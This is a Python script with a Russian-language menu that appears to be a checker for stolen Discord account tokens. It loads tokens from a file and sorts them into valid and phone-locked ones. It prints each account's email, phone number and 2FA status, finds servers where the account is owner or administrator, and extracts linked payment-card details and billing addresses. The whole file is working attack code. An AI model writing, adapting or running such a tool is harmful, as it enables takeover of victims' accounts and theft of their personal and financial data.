import requests
import os
import sys
from colorama import Fore, init
init(autoreset = True)
clear = lambda: os.system('cls') if os.name == 'nt' else os.system('clear')

def printf(*args):
	print(f"{Fore.LIGHTBLUE_EX}>{Fore.RESET} {args[0]}")

def invpr(*args):
	print(f"{Fore.LIGHTRED_EX}>{Fore.RESET} {args[0]}")

def warnpr(*args):
	print(f"{Fore.LIGHTYELLOW_EX}>{Fore.RESET} {args[0]}")
def printbanner():
	print(fr"""{Fore.LIGHTBLUE_EX}
                                  
 ______           ___     _____   
(______) _____  _(___)_  (_____)  
(_)__   (_____)(_)   (_)(_)   (_) 
(____)    _(_) (_)    _ (_)   (_) 
(_)____  (_)__ (_)___(_)(_)___(_) 
(______)(_____)  (___)   (___(__) 
                               (_){Fore.RESET}         
		""")
	banner = f"""
{Fore.LIGHTBLUE_EX}[{Fore.RESET}1{Fore.LIGHTBLUE_EX}]{Fore.RESET} - чекнуть токены
{Fore.LIGHTBLUE_EX}[{Fore.RESET}2{Fore.LIGHTBLUE_EX}]{Fore.RESET} - информация про токены
{Fore.LIGHTBLUE_EX}[{Fore.RESET}3{Fore.LIGHTBLUE_EX}]{Fore.RESET} - переопределить tokens.txt
{Fore.LIGHTBLUE_EX}[{Fore.RESET}4{Fore.LIGHTBLUE_EX}]{Fore.RESET} - из памяти убирает не пригодные для работы токены
{Fore.LIGHTBLUE_EX}[{Fore.RESET}5{Fore.LIGHTBLUE_EX}]{Fore.RESET} - наличие владельцев сервера
{Fore.LIGHTBLUE_EX}[{Fore.RESET}6{Fore.LIGHTBLUE_EX}]{Fore.RESET} - наличие админ прав на сервере
{Fore.LIGHTBLUE_EX}[{Fore.RESET}7{Fore.LIGHTBLUE_EX}]{Fore.RESET} - наличие кредитных карт
{Fore.LIGHTBLUE_EX}[{Fore.RESET}8{Fore.LIGHTBLUE_EX}]{Fore.RESET} - выход

	"""
	print(banner)
clear()
exit = True
with open('tokens.txt', 'r') as file:
	tokens = file.readlines()
	count = 0
	for i in tokens:
		i.strip('\n')

while exit:
	clear()
	printbanner()
	c = int(input(f"{Fore.RESET}Ваш Выбор {Fore.LIGHTBLUE_EX}> {Fore.RESET}"))
	for token in tokens:
		token = token.strip('\n')
		printf(f"Авторизация:{Fore.LIGHTBLUE_EX} {token}{Fore.RESET}")
		if c == 1:
			r = requests.get(
					url = 'https://canary.discord.com/api/v8/users/@me/library',
					headers = {'authorization':token}
				)
			if r.status_code == 401:
				invpr(f"{Fore.LIGHTRED_EX}инвалидный{Fore.RESET}")
			elif r.status_code == 403:
				warnpr(f"{Fore.LIGHTYELLOW_EX}фон локед{Fore.RESET}")
			else:
				printf(f"{Fore.LIGHTBLUE_EX}валидный{Fore.RESET}")
		elif c == 2:
			z = requests.get('https://canary.discordapp.com/api/v8/users/@me', headers=  {'authorization':token, 'Content-Type': 'application/json'}).json()
			api_url =f'https://discord.com/api/v9/users/{z["id"]}/profile?with_mutual_guilds=false'
			r = requests.get(api_url, headers = {'authorization':token})
			if len(r.json()) > 3:
				printf(f"Ник: {Fore.LIGHTBLUE_EX}{r.json()['user']['username']}#{r.json()['user']['discriminator']}")
				printf(f"Био: {Fore.LIGHTBLUE_EX}{r.json()['user']['bio']}")
				printf(f"Id: {Fore.LIGHTBLUE_EX}{r.json()['user']['id']}")
				printf(f"Нитро: {Fore.LIGHTBLUE_EX}{r.json()['premium_since']}")
				printf(f"Бустер: {Fore.LIGHTBLUE_EX}{r.json()['premium_guild_since']}")
				printf(f"Номер Телефона: {Fore.LIGHTBLUE_EX}{z['phone']}")
				printf(f"2х-этапка: {Fore.LIGHTBLUE_EX}{z['mfa_enabled']}")
				printf(f"Верифицирован: {Fore.LIGHTBLUE_EX}{z['verified']}")
				printf(f"Почта: {Fore.LIGHTBLUE_EX}{z['email']}")
				printf(f"Язык: {Fore.LIGHTBLUE_EX}{z['locale']}")
			else:
				invpr("Инвалид")
		elif c == 3:
			tokens = open('tokens.txt', 'r').readlines()
			break
		elif c == '' or c == ' ' or not c:
			pass
		elif c == 4:
			r = requests.get(
					url = 'https://canary.discord.com/api/v8/users/@me/library',
					headers = {'authorization':token}
				)
			global invalid
			invalid = []
			if r.status_code == 401 or r.status_code == 403:
				invalid.append(token)

		elif c == 5:
			headers = {'authorization':token}
			r = requests.get('https://canary.discordapp.com/api/v8/users/@me/guilds', headers = headers).json()
			for guild in r[0:]:
				if guild['owner']:
					printf(f"Айди: {Fore.LIGHTBLUE_EX}{guild['id']}{Fore.RESET} Имя: {Fore.LIGHTBLUE_EX}{guild['name']}{Fore.RESET}")
			
		elif c == 6:
			headers = {'authorization':token}
			r = requests.get('https://canary.discordapp.com/api/v8/users/@me/guilds', headers = headers).json()
			for guild in r[0:]:
				if guild['permissions'] == '274877906943':
					printf(f"Айди: {Fore.LIGHTBLUE_EX}{guild['id']}{Fore.RESET} Имя: {Fore.LIGHTBLUE_EX}{guild['name']}{Fore.RESET}")
		elif c == 7:
			r = requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers = {'authorization':token}).json()
			if len(r) > 0:
				try:
					r = r[0]
				except KeyError:
					continue
				z = r['billing_address']
				printf(f"Действительность: {Fore.LIGHTBLUE_EX}{'Yes' if not r['invalid'] else 'No'}")
				printf(f"Издатель: {Fore.LIGHTBLUE_EX}{r['brand']}")
				printf(f"4 цифры: {Fore.LIGHTBLUE_EX}{r['last_4']}")
				printf(f"Срок до: {Fore.LIGHTBLUE_EX}{r['expires_year']}|{r['expires_month']}")
				printf(f"Имя на карте: {Fore.LIGHTBLUE_EX}{z['name']}")
				printf(f"Город: {Fore.LIGHTBLUE_EX}{z['city']}")
				printf(f"Провинция: {Fore.LIGHTBLUE_EX}{z['state']}")
				printf(f"Страна: {Fore.LIGHTBLUE_EX}{z['country']}")
				printf(f"Почтовый Индекс: {Fore.LIGHTBLUE_EX}{z['postal_code']}")

		elif c == 8:
			exit = False

		print('\n')




	input(f"{Fore.RESET}Enter, чтобы вернуться ")



